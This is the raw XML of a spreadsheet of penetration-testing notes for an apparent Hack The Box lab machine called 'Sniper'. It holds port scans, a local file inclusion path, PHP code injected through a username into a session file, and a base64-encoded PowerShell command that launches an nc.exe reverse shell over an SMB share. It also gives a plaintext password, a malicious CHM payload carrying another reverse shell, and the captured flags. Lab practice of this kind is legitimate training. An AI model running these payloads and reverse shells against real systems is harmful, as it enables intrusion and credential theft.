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13_ncr:1_{90C21E29-90B2-4437-9E94-18D5F46DACC4}" xr6:coauthVersionLast="47" xr6:coauthVersionMax="47" xr10:uidLastSave="{00000000-0000-0000-0000-000000000000}"/>
  <bookViews>
    <workbookView xWindow="-120" yWindow="-16320" windowWidth="29040" windowHeight="15720" xr2:uid="{9AA4AFCA-69F3-4FD9-877C-89FBB0C8B483}"/>
  </bookViews>
  <sheets>
    <sheet name="Network" sheetId="1" r:id="rId1"/>
    <sheet name="Web App" sheetId="3" r:id="rId2"/>
    <sheet name="On host" sheetId="4" r:id="rId3"/>
    <sheet name="Commands" sheetId="2" r:id="rId4"/>
    <sheet name="Misc" sheetId="5" r:id="rId5"/>
    <sheet name="Reverse Engineering" sheetId="6" r:id="rId6"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm._FilterDatabase" localSheetId="0" hidden="1">Network!$A$1:$K$1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5" i="1" l="1"/>
  <c r="E4" i="1"/>
  <c r="F4" i="1"/>
  <c r="F5" i="1"/>
  <c r="E6" i="1"/>
  <c r="F6" i="1"/>
  <c r="F3" i="1"/>
  <c r="E3" i="1"/>
  <c r="E2" i="1"/>
  <c r="F2" i="1"/>
</calcChain>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="98" uniqueCount="71">
  <si>
    <t>IP</t>
  </si>
  <si>
    <t>Hostname</t>
  </si>
  <si>
    <t>Port</t>
  </si>
  <si>
    <t>Protocol</t>
  </si>
  <si>
    <t>Service</t>
  </si>
  <si>
    <t>Notes</t>
  </si>
  <si>
    <t>Commands used</t>
  </si>
  <si>
    <t>Base URL</t>
  </si>
  <si>
    <t>Path</t>
  </si>
  <si>
    <t>Evidence</t>
  </si>
  <si>
    <t>Resources</t>
  </si>
  <si>
    <t>Host</t>
  </si>
  <si>
    <t>User</t>
  </si>
  <si>
    <t>Privileges</t>
  </si>
  <si>
    <t>Groups</t>
  </si>
  <si>
    <t>OS info</t>
  </si>
  <si>
    <t>Status</t>
  </si>
  <si>
    <t>Status + Path (from Kali)</t>
  </si>
  <si>
    <t>Port + Protocol</t>
  </si>
  <si>
    <t>#=LEFT($D2,FIND("/",$D2)-1)</t>
  </si>
  <si>
    <t>#=MID($D2,FIND("/",$D2)+1,LEN($D2))</t>
  </si>
  <si>
    <t>Files/Artifacts</t>
  </si>
  <si>
    <t>Misc</t>
  </si>
  <si>
    <t>Task</t>
  </si>
  <si>
    <t>App</t>
  </si>
  <si>
    <t>Sub task</t>
  </si>
  <si>
    <t>impacket-smbserver share ./ -smb2support</t>
  </si>
  <si>
    <t>Resource</t>
  </si>
  <si>
    <t>responder -I tun0 -v</t>
  </si>
  <si>
    <t>135/tcp</t>
  </si>
  <si>
    <t>49667/tcp</t>
  </si>
  <si>
    <t>80/tcp</t>
  </si>
  <si>
    <t>139/tcp</t>
  </si>
  <si>
    <t>445/tcp</t>
  </si>
  <si>
    <t>80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Sniper Co.
|_http-server-header: Microsoft-IIS/10.0</t>
  </si>
  <si>
    <t>135/tcp   open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</t>
  </si>
  <si>
    <t>445/tcp   open  microsoft-ds?</t>
  </si>
  <si>
    <t>49667/tcp open  msrpc         Microsoft Windows RPC</t>
  </si>
  <si>
    <t>Windows</t>
  </si>
  <si>
    <t>Sniper Co. Shipping.</t>
  </si>
  <si>
    <t>/user/login.php</t>
  </si>
  <si>
    <t>User portal</t>
  </si>
  <si>
    <t>/blog/index.php</t>
  </si>
  <si>
    <t>/user/index.php</t>
  </si>
  <si>
    <t>a&lt;?php echo `dir` ?&gt;b</t>
  </si>
  <si>
    <t>Blog about services.
Might have injectable parameter.
Looking at LFI.
Oh jeeze, you register as a command like "a&lt;?php echo `dir` ?&gt;b" in the username. When you pull the session file it loads that PHP.
Okay you have to get the registration.php file, see what characters are allowed. Then you have an smb share to download your nc.exe. When you run the session, runs the powershell command via php pulling the shell via smb and making the reverse call.</t>
  </si>
  <si>
    <t>nt authority\iusr</t>
  </si>
  <si>
    <t>type db.php</t>
  </si>
  <si>
    <t>Password in db.php.
You find chris' password in db.php. Then you can read user.txt via chris.</t>
  </si>
  <si>
    <t>sniper\chris</t>
  </si>
  <si>
    <t>user.txt: ca4c1da47a1ad6ba538fd3729b40090e</t>
  </si>
  <si>
    <t>Import-Module .\Out-CHM.ps1</t>
  </si>
  <si>
    <t>Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass</t>
  </si>
  <si>
    <t>https://www.create-chm.com/chm-help-compiler/</t>
  </si>
  <si>
    <t>root.txt: ddb65c1993ac6dee9db237c08398cfcf</t>
  </si>
  <si>
    <t>That was tough. Basically you had to make a malicious CHM file. The CEO clicks on it I believe or admin, and that runs a reverse shell back to your machine.</t>
  </si>
  <si>
    <t>sniper\administrator</t>
  </si>
  <si>
    <t>[victim_ip]</t>
  </si>
  <si>
    <t>http://[victim_ip]/</t>
  </si>
  <si>
    <t>http://[victim_ip]/blog/?lang=../../../etc/passwd</t>
  </si>
  <si>
    <t>sudo masscan -pT:1-65535,U:1-65535 --rate=1000 -e tun0 [victim_ip] &gt; raw_ports.txt</t>
  </si>
  <si>
    <t>sudo nmap -p$(cat raw_ports.txt | cut -d ' ' -f 4 | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//') -sS -sV --version-all -sC -O -T3 -v [victim_ip]</t>
  </si>
  <si>
    <t xml:space="preserve">python3 dirsearch.py -u http://[victim_ip] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </t>
  </si>
  <si>
    <t>curl -s -G 'http://[victim_ip]/blog/' --data-urlencode 'lang=\windows\temp\sess_fp189kima4ec93v4rkonhs2gal' | tail</t>
  </si>
  <si>
    <t>copy C:\Users\Chris\Downloads\instructions.chm \\[attack_ip]\share\instructions.chm</t>
  </si>
  <si>
    <t>curl -s -G 'http://[victim_ip]/blog/' --data-urlencode 'lang=\windows\temp\sess_fp189kima4ec93v4rkonhs2gal' 
echo -n 'cmd /c "\\[attack_ip]\share\nc.exe -e cmd [attack_ip] 4444"' | iconv -f ascii -t utf-16le | base64 -w0  
&lt;?php echo `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAXAAxADAALgAxADAALgAxADQALgAxADMAMQBcAHMAaABhAHIAZQBcAG4AYwAuAGUAeABlACAALQBlACAAYwBtAGQAIAAxADAALgAxADAALgAxADQALgAxADMAMQAgADQANAA0ADQAIgA=` ?&gt;
smbserver.py share /home/kali/htb/tools -smb2support
nc -lnvp 4444</t>
  </si>
  <si>
    <t>hostname
$user = "Sniper\Chris"
$pass = "36mEAhz/B8xQ~2VM"
$secstr = New-Object -TypeName System.Security.SecureString
$pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
net user chris
Invoke-Command -ScriptBlock { type \users\chris\desktop\user.txt } -Credential $cred -Computer localhost
ca4c1da47a1ad6ba538fd3729b40090e
Invoke-Command -ScriptBlock { \\[attack_ip]\share\nc.exe -e cmd [attack_ip] 443 } -Credential $cred -Computer localhost</t>
  </si>
  <si>
    <t>Out-CHM -Payload "\windows\system32\spool\drivers\color\nc.exe -e cmd [attack_ip] 5555" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"</t>
  </si>
  <si>
    <t>copy \\[attack_ip]\share\doc.chm .</t>
  </si>
  <si>
    <t>copy \\[attack_ip]\share\nc.exe \windows\system32\spool\drivers\color\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</si>
</sst>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2" fillId="0" borderId="0" xfId="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="4" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="2" fontId="4" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="2" fillId="0" borderId="0" xfId="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="left" vertical="top" wrapText="1"/>
    </xf>
  </cellXfs>
  <cellStyles count="2">
    <cellStyle name="Hyperlink" xfId="1" builtinId="8"/>
    <cellStyle name="Normal" xfId="0" builtinId="0"/>
  </cellStyles>
  <dxfs count="2">
    <dxf>
      <fill>
        <patternFill>
          <bgColor theme="6" tint="0.39994506668294322"/>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reate-chm.com/chm-help-compiler/"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C755-4FE5-4C70-ABDC-86E8ABD7F626}">
  <dimension ref="A1:K22"/>
  <sheetViews>
    <sheetView tabSelected="1" zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="E1" sqref="E1"/>
      <selection pane="bottomLeft" activeCell="F15" sqref="F15"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="18.6640625" style="2" customWidth="1"/>
    <col min="2" max="6" width="15.77734375" style="2"/>
    <col min="7" max="7" width="23.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="35.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="23.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="36.6640625" style="2" customWidth="1"/>
    <col min="11" max="11" width="36.88671875" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>15</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>18</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="J1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>58</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>39</v>
      </c>
      <c r="D2" s="2" t="s">
        <v>29</v>
      </c>
      <c r="E2" s="7" t="str">
        <f t="shared" ref="E2:E6" si="0">LEFT($D2,FIND("/",$D2)-1)</f>
        <v>135</v>
      </c>
      <c r="F2" s="6" t="str">
        <f t="shared" ref="F2:F6" si="1">MID($D2,FIND("/",$D2)+1,LEN($D2))</f>
        <v>tcp</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>35</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>58</v>
      </c>
      <c r="B3" s="1" t="s">
        <v>39</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>30</v>
      </c>
      <c r="E3" s="7" t="str">
        <f t="shared" si="0"/>
        <v>49667</v>
      </c>
      <c r="F3" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G3" s="2" t="s">
        <v>38</v>
      </c>
      <c r="J3" s="5"/>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>58</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>39</v>
      </c>
      <c r="D4" s="2" t="s">
        <v>31</v>
      </c>
      <c r="E4" s="7" t="str">
        <f t="shared" si="0"/>
        <v>80</v>
      </c>
      <c r="F4" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>34</v>
      </c>
      <c r="I4" s="4"/>
      <c r="J4" s="5"/>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="2" t="s">
        <v>58</v>
      </c>
      <c r="B5" s="1" t="s">
        <v>39</v>
      </c>
      <c r="D5" s="2" t="s">
        <v>32</v>
      </c>
      <c r="E5" s="7" t="str">
        <f>LEFT($D5,FIND("/",$D5)-1)</f>
        <v>139</v>
      </c>
      <c r="F5" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G5" s="2" t="s">
        <v>36</v>
      </c>
      <c r="I5" s="4"/>
      <c r="J5" s="5"/>
    </row>
    <row r="6" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="2" t="s">
        <v>58</v>
      </c>
      <c r="B6" s="2" t="s">
        <v>39</v>
      </c>
      <c r="D6" s="2" t="s">
        <v>33</v>
      </c>
      <c r="E6" s="7" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F6" s="6" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G6" s="2" t="s">
        <v>37</v>
      </c>
      <c r="J6" s="5"/>
    </row>
    <row r="7" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E7" s="7"/>
      <c r="F7" s="6"/>
    </row>
    <row r="8" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E8" s="7"/>
      <c r="F8" s="6"/>
    </row>
    <row r="9" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E9" s="7"/>
      <c r="F9" s="6"/>
      <c r="I9" s="4"/>
      <c r="J9" s="5"/>
    </row>
    <row r="10" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="7"/>
      <c r="F10" s="6"/>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E11" s="7"/>
      <c r="F11" s="6"/>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F12" s="6"/>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F13" s="6"/>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F14" s="6"/>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F15" s="6"/>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F16" s="6"/>
    </row>
    <row r="17" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F17" s="6"/>
    </row>
    <row r="18" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F18" s="6"/>
    </row>
    <row r="19" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F19" s="6"/>
    </row>
    <row r="20" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F20" s="6"/>
    </row>
    <row r="21" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F21" s="6"/>
    </row>
    <row r="22" spans="6:6" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="F22" s="6"/>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K11">
    <sortCondition ref="F2:F11"/>
    <sortCondition ref="E2:E11"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <conditionalFormatting sqref="F2:F22">
    <cfRule type="cellIs" dxfId="1" priority="1" operator="equal">
      <formula>"udp"</formula>
    </cfRule>
    <cfRule type="cellIs" dxfId="0" priority="2" operator="equal">
      <formula>"tcp"</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B5CB-E7C9-4655-B0CB-02AE97F3D2B4}">
  <dimension ref="A1:I22"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="A5" sqref="A5"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="38.44140625" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.109375" style="2" customWidth="1"/>
    <col min="3" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="39.5546875" style="2" customWidth="1"/>
    <col min="6" max="6" width="107.6640625" style="2" customWidth="1"/>
    <col min="7" max="7" width="30.5546875" style="2" customWidth="1"/>
    <col min="8" max="8" width="15.77734375" style="2"/>
    <col min="9" max="9" width="45.5546875" style="2" customWidth="1"/>
    <col min="10" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:9" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>59</v>
      </c>
      <c r="D2" s="2">
        <v>200</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>40</v>
      </c>
    </row>
    <row r="3" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>59</v>
      </c>
      <c r="D3" s="2">
        <v>200</v>
      </c>
      <c r="E3" s="2" t="s">
        <v>41</v>
      </c>
      <c r="F3" s="2" t="s">
        <v>42</v>
      </c>
      <c r="H3" s="5"/>
    </row>
    <row r="4" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="2" t="s">
        <v>59</v>
      </c>
      <c r="D4" s="2">
        <v>200</v>
      </c>
      <c r="E4" s="2" t="s">
        <v>43</v>
      </c>
      <c r="F4" s="2" t="s">
        <v>46</v>
      </c>
      <c r="G4" s="2" t="s">
        <v>60</v>
      </c>
      <c r="H4" s="5"/>
    </row>
    <row r="5" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="2" t="s">
        <v>59</v>
      </c>
      <c r="D5" s="2">
        <v>200</v>
      </c>
      <c r="E5" s="2" t="s">
        <v>44</v>
      </c>
    </row>
    <row r="8" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G8" s="5"/>
    </row>
    <row r="9" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E9" s="4"/>
    </row>
    <row r="10" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E10" s="4"/>
    </row>
    <row r="11" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E11" s="4"/>
    </row>
    <row r="12" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E12" s="4"/>
    </row>
    <row r="13" spans="1:9" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E13" s="4"/>
    </row>
    <row r="22" spans="8:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="H22" s="5"/>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3C73-22A5-4008-8739-F489AE5D585F}">
  <dimension ref="A1:K5"/>
  <sheetViews>
    <sheetView zoomScale="75" zoomScaleNormal="75" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="A4" sqref="A4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="15.77734375" defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="21.88671875" style="2" customWidth="1"/>
    <col min="2" max="4" width="15.77734375" style="2"/>
    <col min="5" max="5" width="30.109375" style="2" customWidth="1"/>
    <col min="6" max="7" width="15.77734375" style="2"/>
    <col min="8" max="8" width="47.88671875" style="2" customWidth="1"/>
    <col min="9" max="9" width="18.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="85.21875" style="2" customWidth="1"/>
    <col min="11" max="11" width="38.44140625" style="2" customWidth="1"/>
    <col min="12" max="16384" width="15.77734375" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>13</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>59</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>47</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>49</v>
      </c>
      <c r="I2" s="5"/>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>59</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>50</v>
      </c>
      <c r="I3" s="5"/>
      <c r="J3" s="2" t="s">
        <v>51</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1" t="s">
        <v>59</v>
      </c>
      <c r="E4" s="1" t="s">
        <v>57</v>
      </c>
      <c r="H4" s="2" t="s">
        <v>56</v>
      </c>
      <c r="J4" s="2" t="s">
        <v>55</v>
      </c>
    </row>
    <row r="5" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1"/>
      <c r="J5" s="4"/>
    </row>
  </sheetData>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E388-0D5B-4574-B9C5-0C945BA9368E}">
  <dimension ref="A1:B20"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="B17" sqref="B17"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="109.33203125" style="6" customWidth="1"/>
    <col min="2" max="2" width="18.44140625" style="2" customWidth="1"/>
    <col min="3" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:2" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>27</v>
      </c>
    </row>
    <row r="2" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="8" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="3" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="8" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="4" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="6" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="6" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="6" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="7" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="6" t="s">
        <v>26</v>
      </c>
    </row>
    <row r="8" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="6" t="s">
        <v>65</v>
      </c>
    </row>
    <row r="9" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="6" t="s">
        <v>28</v>
      </c>
    </row>
    <row r="10" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="6" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="11" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="6" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="12" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="6" t="s">
        <v>66</v>
      </c>
    </row>
    <row r="13" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="6" t="s">
        <v>48</v>
      </c>
    </row>
    <row r="14" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="6" t="s">
        <v>67</v>
      </c>
    </row>
    <row r="15" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="6" t="s">
        <v>52</v>
      </c>
    </row>
    <row r="16" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="6" t="s">
        <v>53</v>
      </c>
    </row>
    <row r="17" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="6" t="s">
        <v>68</v>
      </c>
      <c r="B17" s="9" t="s">
        <v>54</v>
      </c>
    </row>
    <row r="18" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="6" t="s">
        <v>69</v>
      </c>
    </row>
    <row r="19" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="6" t="s">
        <v>70</v>
      </c>
    </row>
    <row r="20" spans="1:2" s="8" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="6"/>
    </row>
  </sheetData>
  <hyperlinks>
    <hyperlink ref="B17" r:id="rId1" xr:uid="{0CACEF40-1C9D-461C-AC3E-3BEA8F07AD3C}"/>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FAFEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1:A2"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A31" sqref="A31"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="5"/>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42D08-FB8B-4BAB-A462-7059BEE8513F}">
  <dimension ref="A1:D3"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="D12" sqref="D12"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="14.4" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="12.109375" style="1" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.5546875" style="1" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="15.5546875" style="1" customWidth="1"/>
    <col min="4" max="4" width="29.6640625" style="1" bestFit="1" customWidth="1"/>
    <col min="5" max="16384" width="8.88671875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:4" s="3" customFormat="1" x14ac:dyDescent="0.3">
      <c r="A1" s="3" t="s">
        <v>24</v>
      </c>
      <c r="B1" s="3" t="s">
        <v>23</v>
      </c>
      <c r="C1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="D1" s="3" t="s">
        <v>5</v>
      </c>
